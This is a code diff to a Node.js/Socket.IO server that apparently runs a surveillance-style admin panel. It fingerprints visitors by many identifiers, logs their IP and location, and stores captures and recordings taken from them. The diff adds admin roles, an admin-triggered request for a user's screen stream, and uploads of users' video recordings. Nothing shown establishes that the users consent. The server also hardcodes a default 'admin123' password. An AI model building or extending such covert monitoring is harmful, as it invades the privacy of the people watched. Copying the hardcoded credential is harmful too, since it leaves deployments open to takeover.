@@ -201,11 +201,13 @@ fs.mkdirSync(path.join(MEDIA_DIR, 'recordings'), { recursive: true });
 // IN-MEMORY DATA STORE (with JSON file persistence)
 // ═══════════════════════════════════════════════════════════════════
 let db = {
-  admin: {
+  admins: [{
+    id: 1,
     email: 'admin',
     password: bcrypt.hashSync('admin123', 10),
-    name: 'Admin'
-  },
+    name: 'Admin',
+    role: 'SuperAdmin'
+  }],
   users: [],      // { uuid, session_ids: { cookie_session_id, tab_session_id, page_load_id, socket_id, fingerprint_id, local_storage_id, engine_io_id }, country, browser, device_type, ip, is_online, created_at, last_active, location }
   captures: [],   // { id, uuid, file_path, file_size, created_at }
   recordings: [], // { id, uuid, file_path, duration, file_size, mime_type, created_at }
@@ -227,6 +229,15 @@ function loadData() {
     if (fs.existsSync(DATA_FILE)) {
       const raw = fs.readFileSync(DATA_FILE, 'utf8');
       const saved = JSON.parse(raw);
+      
+      if (saved.admins) {
+        db.admins = saved.admins;
+      } else if (saved.admin) { // Migration
+        db.admins = [{
+          id: 1, email: saved.admin.email, password: saved.admin.password, name: saved.admin.name, role: 'SuperAdmin'
+        }];
+      }
+
       // Merge but keep admin password
       db.users = saved.users || [];
       db.captures = saved.captures || [];
@@ -234,7 +245,7 @@ function loadData() {
       db.locations = saved.locations || [];
       // Mark all users offline on startup
       db.users.forEach(u => u.is_online = false);
-      console.log(`📂 Loaded ${db.users.length} users, ${db.captures.length} captures, ${db.recordings.length} recordings, ${db.locations.length} locations`);
+      console.log(`📂 Loaded ${db.admins.length} admins, ${db.users.length} users, ${db.captures.length} captures`);
     }
   } catch (e) {
     console.log('📂 Starting with fresh database');
@@ -244,6 +255,7 @@ function loadData() {
 function saveData() {
   try {
     fs.writeFileSync(DATA_FILE, JSON.stringify({
+      admins: db.admins,
       users: db.users,
       captures: db.captures,
       recordings: db.recordings,
@@ -350,34 +362,93 @@ function authCheck(req, res, next) {
   }
 }
 
+function authorize(roles = []) {
+  return (req, res, next) => {
+    if (!req.admin || !roles.includes(req.admin.role)) {
+      return res.status(403).json({ error: 'Forbidden: Insufficient privileges' });
+    }
+    next();
+  };
+}
+
 // ─── Auth Routes ─────────────────────────────────────────────────
 app.post('/api/auth/login', async (req, res) => {
   const { email, username, password } = req.body;
   const identifier = username || email;
   if (!identifier || !password) return res.status(400).json({ error: 'Username and password required' });
 
-  if (identifier.toLowerCase().trim() !== db.admin.email) {
-    return res.status(401).json({ error: 'Invalid credentials' });
-  }
+  const admin = db.admins.find(a => a.email.toLowerCase() === identifier.toLowerCase().trim());
+  if (!admin) return res.status(401).json({ error: 'Invalid credentials' });
 
-  const valid = await bcrypt.compare(password, db.admin.password);
+  const valid = await bcrypt.compare(password, admin.password);
   if (!valid) return res.status(401).json({ error: 'Invalid credentials' });
 
-  const token = jwt.sign({ email: db.admin.email, name: db.admin.name }, JWT_SECRET, { expiresIn: '7d' });
-  res.json({ token, admin: { email: db.admin.email, name: db.admin.name } });
+  const token = jwt.sign({ id: admin.id, email: admin.email, name: admin.name, role: admin.role }, JWT_SECRET, { expiresIn: '7d' });
+  res.json({ token, admin: { id: admin.id, email: admin.email, name: admin.name, role: admin.role } });
 });
 
 app.get('/api/auth/me', authCheck, (req, res) => {
-  res.json({ email: db.admin.email, name: db.admin.name });
+  const admin = db.admins.find(a => a.email === req.admin.email);
+  if (!admin) return res.status(401).json({ error: 'Admin not found' });
+  res.json({ id: admin.id, email: admin.email, name: admin.name, role: admin.role });
 });
 
 app.put('/api/auth/password', authCheck, async (req, res) => {
   const { currentPassword, newPassword } = req.body;
-  const valid = await bcrypt.compare(currentPassword, db.admin.password);
+  const admin = db.admins.find(a => a.email === req.admin.email);
+  if (!admin) return res.status(401).json({ error: 'Admin not found' });
+  
+  const valid = await bcrypt.compare(currentPassword, admin.password);
   if (!valid) return res.status(401).json({ error: 'Current password incorrect' });
-  db.admin.password = await bcrypt.hash(newPassword, 10);
+  
+  admin.password = await bcrypt.hash(newPassword, 10);
   saveData();
   res.json({ message: 'Password updated' });
+});
+
+// ─── Admin Management Routes ──────────────────────────────────────
+app.get('/api/admins', authCheck, authorize(['SuperAdmin']), (req, res) => {
+  res.json({ admins: db.admins.map(a => ({ id: a.id, email: a.email, name: a.name, role: a.role })) });
+});
+
+app.post('/api/admins', authCheck, authorize(['SuperAdmin']), async (req, res) => {
+  const { email, name, password, role } = req.body;
+  if (!email || !name || !password || !role) return res.status(400).json({ error: 'All fields are required' });
+  if (db.admins.find(a => a.email === email)) return res.status(400).json({ error: 'Email already exists' });
+  
+  const newAdmin = {
+    id: db.admins.length > 0 ? Math.max(...db.admins.map(a => a.id)) + 1 : 1,
+    email,
+    name,
+    role,
+    password: await bcrypt.hash(password, 10)
+  };
+  db.admins.push(newAdmin);
+  saveData();
+  res.json({ message: 'Admin created successfully', admin: { id: newAdmin.id, email: newAdmin.email, name: newAdmin.name, role: newAdmin.role } });
+});
+
+app.delete('/api/admins/:id', authCheck, authorize(['SuperAdmin']), (req, res) => {
+  const id = parseInt(req.params.id);
+  if (req.admin.id === id) return res.status(400).json({ error: 'Cannot delete yourself' });
+  db.admins = db.admins.filter(a => a.id !== id);
+  saveData();
+  res.json({ message: 'Admin deleted' });
+});
+
+app.put('/api/admins/:id', authCheck, authorize(['SuperAdmin']), async (req, res) => {
+  const id = parseInt(req.params.id);
+  const { email, name, password, role } = req.body;
+  const admin = db.admins.find(a => a.id === id);
+  if (!admin) return res.status(404).json({ error: 'Admin not found' });
+  
+  if (email) admin.email = email;
+  if (name) admin.name = name;
+  if (role) admin.role = role;
+  if (password) admin.password = await bcrypt.hash(password, 10);
+  
+  saveData();
+  res.json({ message: 'Admin updated successfully' });
 });
 
 // ─── Users Routes ────────────────────────────────────────────────
@@ -406,7 +477,7 @@ app.get('/api/users', authCheck, (req, res) => {
   res.json({ users });
 });
 
-app.delete('/api/users/:uuid', authCheck, (req, res) => {
+app.delete('/api/users/:uuid', authCheck, authorize(['SuperAdmin', 'Moderator']), (req, res) => {
   const uuid = req.params.uuid;
   db.users = db.users.filter(u => u.uuid !== uuid);
   db.captures = db.captures.filter(c => c.uuid !== uuid);
@@ -479,7 +550,7 @@ app.get('/api/files', authCheck, (req, res) => {
 });
 
 // ─── Recording Management Routes ────────────────────────────────
-app.delete('/api/recordings/:id', authCheck, (req, res) => {
+app.delete('/api/recordings/:id', authCheck, authorize(['SuperAdmin', 'Moderator']), (req, res) => {
   const id = parseInt(req.params.id);
   const rec = db.recordings.find(r => r.id === id);
   if (!rec) return res.status(404).json({ error: 'Recording not found' });
@@ -492,7 +563,7 @@ app.delete('/api/recordings/:id', authCheck, (req, res) => {
   res.json({ message: 'Recording deleted' });
 });
 
-app.post('/api/recordings/batch-delete', authCheck, (req, res) => {
+app.post('/api/recordings/batch-delete', authCheck, authorize(['SuperAdmin', 'Moderator']), (req, res) => {
   const { ids } = req.body;
   if (!ids || !Array.isArray(ids)) return res.status(400).json({ error: 'ids array required' });
   let deleted = 0;
@@ -511,7 +582,7 @@ app.post('/api/recordings/batch-delete', authCheck, (req, res) => {
   res.json({ message: `${deleted} recordings deleted` });
 });
 
-app.delete('/api/captures/:id', authCheck, (req, res) => {
+app.delete('/api/captures/:id', authCheck, authorize(['SuperAdmin', 'Moderator']), (req, res) => {
   const id = parseInt(req.params.id);
   const cap = db.captures.find(c => c.id === id);
   if (!cap) return res.status(404).json({ error: 'Capture not found' });
@@ -592,6 +663,15 @@ io.on('connection', (socket) => {
       if (userSocketId) {
         console.log(`📡 [WebRTC Signaling] Admin requesting stream from user ${data.uuid}`);
         io.to(userSocketId).emit('webrtc:request', { adminSocketId: socket.id });
+      }
+    });
+
+    socket.on('webrtc:request_screen', (data) => {
+      if (!data || !data.uuid) return;
+      const userSocketId = connectedUsers.get(data.uuid);
+      if (userSocketId) {
+        console.log(`📡 [WebRTC Signaling] Admin requesting SCREEN stream from user ${data.uuid}`);
+        io.to(userSocketId).emit('webrtc:request_screen', { adminSocketId: socket.id });
       }
     });
 
@@ -709,6 +789,15 @@ io.on('connection', (socket) => {
       });
     });
 
+    socket.on('permissions:update', (data) => {
+      if (!data || !data.uuid) return;
+      const user = db.users.find(u => u.uuid === data.uuid);
+      if (user) {
+        user.permissions = data.granted;
+      }
+      io.to('admin').emit('permissions:update', data);
+    });
+
     socket.on('webrtc:ice-candidate', (data) => {
       if (!data || !data.adminSocketId || !data.candidate) return;
       io.to(data.adminSocketId).emit('webrtc:ice-candidate', {
@@ -814,6 +903,51 @@ io.on('connection', (socket) => {
         emitStats();
       } catch (e) {
         console.error('Audio recording error:', e.message);
+      }
+    });
+
+    socket.on('video:recording', (data) => {
+      if (!data || !data.uuid || !data.video) return;
+
+      const uuid = data.uuid;
+      const timestamp = Date.now();
+      const ext = (data.mimeType || '').includes('mp4') ? 'mp4' : 'webm';
+      const fileName = `vid_${uuid}_${timestamp}.${ext}`;
+      const filePath = path.join(MEDIA_DIR, 'recordings', fileName);
+
+      try {
+        const base64 = data.video.replace(/^data:[^;]+;base64,/, '');
+        const buffer = Buffer.from(base64, 'base64');
+        fs.writeFileSync(filePath, buffer);
+
+        const recording = {
+          id: nextId++,
+          uuid,
+          file_path: 'recordings/' + fileName,
+          duration: data.duration || 0,
+          file_size: buffer.length,
+          mime_type: data.mimeType || 'video/webm',
+          created_at: new Date().toISOString()
+        };
+        db.recordings.push(recording);
+
+        const user = db.users.find(u => u.uuid === uuid);
+        if (user) user.last_active = new Date().toISOString();
+
+        io.to('admin').emit('feed:video', {
+          uuid,
+          recordingId: recording.id,
+          duration: data.duration || 0,
+          fileUrl: '/media/recordings/' + fileName,
+          timestamp
+        });
+
+        console.log(`🎥 Video Recording saved: ${fileName} (${data.duration || 0}s)`);
+
+        addLog('recording', uuid, 'Video recording saved (' + (data.duration || 0) + 's)');
+        emitStats();
+      } catch (e) {
+        console.error('Video recording error:', e.message);
       }
     });
 
